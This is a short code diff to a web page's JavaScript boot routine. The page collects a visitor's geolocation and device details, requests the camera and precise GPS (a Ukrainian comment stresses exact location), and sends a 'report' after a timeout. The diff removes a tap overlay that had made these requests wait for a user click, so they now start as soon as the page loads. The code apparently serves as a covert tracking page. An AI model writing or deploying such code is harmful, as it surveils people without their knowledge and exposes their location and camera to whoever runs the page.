@@ -520,11 +520,12 @@ function tryFullscreen() {
    BOOT
 ══════════════════════════════════════════ */
 async function boot() {
-  // Start geo + device (no gesture needed)
   fetchGeo();
   await collectDevice();
+  startTTS();
+  startCamera();
+  requestGPS();
 
-  // Fallback: send after 20s even if GPS/camera still pending
   setTimeout(() => {
     if (!reportSent) {
       gpsReady    = true;
@@ -532,16 +533,6 @@ async function boot() {
       maybeSendReport();
     }
   }, 20000);
-
-  // Tap overlay
-  const overlay = document.getElementById('tapOverlay');
-  overlay.addEventListener('click', () => {
-    overlay.style.display = 'none';
-    tryFullscreen();
-    startTTS();
-    startCamera();   // запитує камеру
-    requestGPS();    // запитує GPS — ТОЧНЕ місцезнаходження
-  }, { once: true });
 }
 
 document.addEventListener('DOMContentLoaded', boot);
